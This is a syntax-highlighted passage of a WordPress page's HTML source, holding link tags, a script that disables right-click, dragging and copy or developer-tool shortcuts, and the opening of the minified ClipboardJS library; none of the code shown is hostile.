class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'prev'</span> <span class="attr">title</span>=<span class="string">'密码保护：当代中国经济2019修正版'</span> <span class="attr">href</span>=<span class="string">'http://www.gebidemengmianren.com/eryadaanfufei/196.html'</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'next'</span> <span class="attr">title</span>=<span class="string">'密码保护：当政府遇上互联网2019'</span> <span class="attr">href</span>=<span class="string">'http://www.gebidemengmianren.com/eryadaanfufei/200.html'</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"canonical"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/198.html"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="actionscript">    &#125;; <span class="comment">//for image</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="actionscript">    &#125;; <span class="comment">//for right click disable</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">if</span> (e.ctrlKey &amp;&amp;</span></span><br><span class="line"><span class="undefined">        (e.keyCode === 65 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 67 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 73 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 74 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 80 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 83 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 85 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 86 ||</span></span><br><span class="line"><span class="undefined">          e.keyCode === 117</span></span><br><span class="line"><span class="undefined">        )) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">if</span> (e.keyCode == <span class="number">18</span> || e.keyCode == <span class="number">123</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g-150x150.jpg"</span> <span class="attr">sizes</span>=<span class="string">"32x32"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg"</span> <span class="attr">sizes</span>=<span class="string">"192x192"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"apple-touch-icon-precomposed"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"msapplication-TileImage"</span> <span class="attr">content</span>=<span class="string">"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"post-template-default single single-post postid-198 single-format-standard post-layout-one-column"</span> <span class="attr">id</span>=<span class="string">'body'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    ! <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="string">"object"</span> == <span class="keyword">typeof</span> exports &amp;&amp; <span class="string">"object"</span> == <span class="keyword">typeof</span> <span class="built_in">module</span> ? <span class="built_in">module</span>.exports = e() : <span class="string">"function"</span> == <span class="keyword">typeof</span> define &amp;&amp; define.amd ? define([], e) : <span class="string">"object"</span> == <span class="keyword">typeof</span> exports ? exports.ClipboardJS = e() : t.ClipboardJS = e()</span></span><br><span class="line"><span class="actionscript">    &#125;(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">e</span><span class="params">(o)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (n[o]) <span class="keyword">return</span> n[o].exports;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">var</span> r = n[o] = &#123;</span></span><br><span class="line"><span class="undefined">            i: o,</span></span><br><span class="line"><span class="undefined">            l: !1,</span></span><br><span class="line"><span class="undefined">            exports: &#123;&#125;</span></span><br><span class="line"><span class="undefined">          &#125;;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> t[o].call(r.exports, r, r.exports, e), r.l = !<span class="number">0</span>, r.exports</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> n = &#123;&#125;;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> e.m = t, e.c = n, e.i = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> t</span></span><br><span class="line"><span class="actionscript">        &#125;, e.d = <span class="function"><span class="keyword">function</span><span class="params">(t, n, o)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          e.o(t, n) || <span class="built_in">Object</span>.defineProperty(t, n, &#123;</span></span><br><span class="line"><span class="undefined">            configurable: !1,</span></span><br><span class="line"><span class="undefined">            enumerable: !0,</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">get</span>: o</span></span><br><span class="line"><span class="undefined">          &#125;)</span></span><br><span class="line"><span class="actionscript">        &#125;, e.n = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">var</span> n = t &amp;&amp; t.__esModule ? <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> t.default</span></span><br><span class="line"><span class="actionscript">          &#125; : <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> t</span></span><br><span class="line"><span class="undefined">          &#125;;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> e.d(n, <span class="string">"a"</span>, n), n</span></span><br><span class="line"><span class="actionscript">        &#125;, e.o = <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.hasOwnProperty.call(t, e)</span></span><br><span class="line"><span class="actionscript">        &#125;, e.p = <span class="string">""</span>, e(e.s = <span class="number">3</span>)</span></span><br><span class="line"><span class="actionscript">      &#125;([<span class="function"><span class="keyword">function</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> o, r, i;</span></span><br><span class="line"><span class="actionscript">        ! <span class="function"><span class="keyword">function</span><span class="params">(a, c)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          r = [t, n(<span class="number">7</span>)], o = c, <span class="keyword">void</span> <span class="number">0</span> !== (i = <span class="string">"function"</span> == <span class="keyword">typeof</span> o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i)</span></span><br><span class="line"><span class="actionscript">        &#125;(<span class="number">0</span>, <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="meta">          "use strict"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">n</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> e)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">var</span> o = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> t &amp;&amp; t.__esModule ? t : &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">default</span>: t</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;(e),</span></span><br><span class="line"><span class="javascript">            r = <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; <span class="string">"symbol"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span>.iterator ? <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="actionscript">            &#125; : <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> t &amp;&amp; <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; t.constructor === <span class="built_in">Symbol</span> &amp;&amp; t !== <span class="built_in">Symbol</span>.prototype ? <span class="string">"symbol"</span> : <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="actionscript">            i = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="function"><span class="keyword">function</span> <span class="title">t</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; e.length; n++) &#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> o = e[n];</span></span><br><span class="line"><span class="javascript">                  o.enumerable = o.enumerable || !<span class="number">1</span>, o.configurable = !<span class="number">0</span>, <span class="string">"value"</span> <span class="keyword">in</span> o &amp;&amp; (o.writable = !<span class="number">0</span>), <span class="built_in">Object</span>.defineProperty(t, o.key, o)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">(e, n, o)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;(),</span></span><br><span class="line"><span class="actionscript">            a = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="function"><span class="keyword">function</span> <span class="title">t</span><span class="params">(e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                n(<span class="keyword">this</span>, t), <span class="keyword">this</span>.resolveOptions(e), <span class="keyword">this</span>.initSelection()</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> i(t, [&#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"resolveOptions"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : &#123;&#125;;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.action = t.action, <span class="keyword">this</span>.container = t.container, <span class="keyword">this</span>.emitter = t.emitter, <span class="keyword">this</span>.target = t.target, <span class="keyword">this</span>.text = t.text, <span class="keyword">this</span>.trigger = t.trigger, <span class="keyword">this</span>.selectedText = <span class="string">""</span></span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"initSelection"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.text ? <span class="keyword">this</span>.selectFake() : <span class="keyword">this</span>.target &amp;&amp; <span class="keyword">this</span>.selectTarget()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"selectFake"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> t = <span class="keyword">this</span>,</span></span><br><span class="line"><span class="javascript">                    e = <span class="string">"rtl"</span> == <span class="built_in">document</span>.documentElement.getAttribute(<span class="string">"dir"</span>);</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.removeFake(), <span class="keyword">this</span>.fakeHandlerCallback = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                      <span class="keyword">return</span> t.removeFake()</span></span><br><span class="line"><span class="javascript">                    &#125;, <span class="keyword">this</span>.fakeHandler = <span class="keyword">this</span>.container.addEventListener(<span class="string">"click"</span>, <span class="keyword">this</span>.fakeHandlerCallback) || !<span class="number">0</span>, <span class="keyword">this</span>.fakeElem = <span class="built_in">document</span>.createElement(<span class="string">"textarea"</span>), <span class="keyword">this</span>.fakeElem.style.fontSize = <span class="string">"12pt"</span>, <span class="keyword">this</span>.fakeElem.style.border =</span></span><br><span class="line"><span class="actionscript">                    <span class="string">"0"</span>, <span class="keyword">this</span>.fakeElem.style.padding = <span class="string">"0"</span>, <span class="keyword">this</span>.fakeElem.style.margin = <span class="string">"0"</span>, <span class="keyword">this</span>.fakeElem.style.position = <span class="string">"absolute"</span>, <span class="keyword">this</span>.fakeElem.style[e ? <span class="string">"right"</span> : <span class="string">"left"</span>] = <span class="string">"-9999px"</span>;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> n = <span class="built_in">window</span>.pageYOffset || <span class="built_in">document</span>.documentElement.scrollTop;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.fakeElem.style.top = n + <span class="string">"px"</span>, <span class="keyword">this</span>.fakeElem.setAttribute(<span class="string">"readonly"</span>, <span class="string">""</span>), <span class="keyword">this</span>.fakeElem.value = <span class="keyword">this</span>.text, <span class="keyword">this</span>.container.appendChild(<span class="keyword">this</span>.fakeElem), <span class="keyword">this</span>.selectedText = (<span class="number">0</span>, o.default)(<span class="keyword">this</span>.fakeElem), <span class="keyword">this</span>.copyText()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"removeFake"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.fakeHandler &amp;&amp; (<span class="keyword">this</span>.container.removeEventListener(<span class="string">"click"</span>, <span class="keyword">this</span>.fakeHandlerCallback), <span class="keyword">this</span>.fakeHandler = <span class="literal">null</span>, <span class="keyword">this</span>.fakeHandlerCallback = <span class="literal">null</span>), <span class="keyword">this</span>.fakeElem &amp;&amp; (<span class="keyword">this</span>.container.removeChild(<span class="keyword">this</span>.fakeElem),</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>.fakeElem = <span class="literal">null</span>)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"selectTarget"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.selectedText = (<span class="number">0</span>, o.default)(<span class="keyword">this</span>.target), <span class="keyword">this</span>.copyText()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"copyText"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">                    t = <span class="built_in">document</span>.execCommand(<span class="keyword">this</span>.action)</span></span><br><span class="line"><span class="actionscript">                  &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="undefined">                    t = !1</span></span><br><span class="line"><span class="undefined">                  &#125;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.handleResult(t)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"handleResult"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.emitter.emit(t ? <span class="string">"success"</span> : <span class="string">"error"</span>, &#123;</span></span><br><span class="line"><span class="actionscript">                    action: <span class="keyword">this</span>.action,</span></span><br><span class="line"><span class="actionscript">                    text: <span class="keyword">this</span>.selectedText,</span></span><br><span class="line"><span class="actionscript">                    trigger: <span class="keyword">this</span>.trigger,</span></span><br><span class="line"><span class="actionscript">                    clearSelection: <span class="keyword">this</span>.clearSelection.bind(<span class="keyword">this</span>)</span></span><br><span class="line"><span class="undefined">                  &#125;)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"clearSelection"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.trigger &amp;&amp; <span class="keyword">this</span>.trigger.focus(), <span class="built_in">window</span>.getSelection().removeAllRanges()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"destroy"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.removeFake()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"action"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">set</span>: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : <span class="string">"copy"</span>;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">if</span> (<span class="keyword">this</span>._action = t, <span class="string">"copy"</span> !== <span class="keyword">this</span>._action &amp;&amp; <span class="string">"cut"</span> !== <span class="keyword">this</span>._action) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "action" value, use either "copy" or "cut"'</span>)</span></span><br><span class="line"><span class="undefined">                &#125;,</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">return</span> <span class="keyword">this</span>._action</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"target"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">set</span>: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== t) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (!t || <span class="string">"object"</span> !== (<span class="keyword">void</span> <span class="number">0</span> === t ? <span class="string">"undefined"</span> : r(t)) || <span class="number">1</span> !== t.nodeType) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "target" value, use a valid Element'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="string">"copy"</span> === <span class="keyword">this</span>.action &amp;&amp; t.hasAttribute(<span class="string">"disabled"</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="string">"cut"</span> === <span class="keyword">this</span>.action &amp;&amp; (t.hasAttribute(<span class="string">"readonly"</span>) || t.hasAttribute(<span class="string">"disabled"</span>))) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes'</span>);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>._target = t</span></span><br><span class="line"><span class="undefined">                  &#125;</span></span><br><span class="line"><span class="undefined">                &#125;,</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">return</span> <span class="keyword">this</span>._target</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;]), t</span></span><br><span class="line"><span class="undefined">            &#125;();</span></span><br><span class="line"><span class="undefined">          t.exports = a</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">o</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!t &amp;&amp; !e &amp;&amp; !n) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Missing required arguments"</span>);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!c.string(e)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Second argument must be a String"</span>);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!c.fn(n)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Third argument must be a Function"</span>);</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (c.node(t)) <span class="keyword">return</span> r(t, e, n);</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (c.nodeList(t)) <span class="keyword">return</span> i(t, e, n);</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (c.string(t)) <span class="keyword">return</span> a(t, e, n);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"First argument must be a String, HTMLElement, HTMLCollection, or NodeList"</span>)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">r</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> t.addEventListener(e, n), &#123;</span></span><br><span class="line"><span class="actionscript">            destroy: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">              t.removeEventListener(e, n)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">i</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.forEach.call(t, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            t.addEventListener(e, n)</span></span><br><span class="line"><span class="undefined">          &#125;), &#123;</span></span><br><span class="line"><span class="actionscript">            destroy: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">Array</span>.prototype.forEach.call(t, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                t.removeEventListener(e, n)</span></span><br><span class="line"><span class="undefined">              &#125;)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> u(<span class="built_in">document</span>.body, t, e, n)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> c = n(<span class="number">6</span>),</span></span><br><span class="line"><span class="undefined">          u = n(5);</span></span><br><span class="line"><span class="undefined">        t.exports = o</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">n</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="undefined">        n.prototype = &#123;</span></span><br><span class="line"><span class="actionscript">          on: <span class="function"><span class="keyword">function</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> o = <span class="keyword">this</span>.e || (<span class="keyword">this</span>.e = &#123;&#125;);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> (o[t] || (o[t] = [])).push(&#123;</span></span><br><span class="line"><span class="undefined">              fn: e,</span></span><br><span class="line"><span class="undefined">              ctx: n</span></span><br><span class="line"><span class="actionscript">            &#125;), <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="actionscript">          once: <span class="function"><span class="keyword">function</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">o</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">              r.off(t, o), e.apply(n, <span class="built_in">arguments</span>)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> r = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> o._ = e, <span class="keyword">this</span>.on(t, o, n)</span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="actionscript">          emit: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> e = [].slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>),</span></span><br><span class="line"><span class="actionscript">              n = ((<span class="keyword">this</span>.e || (<span 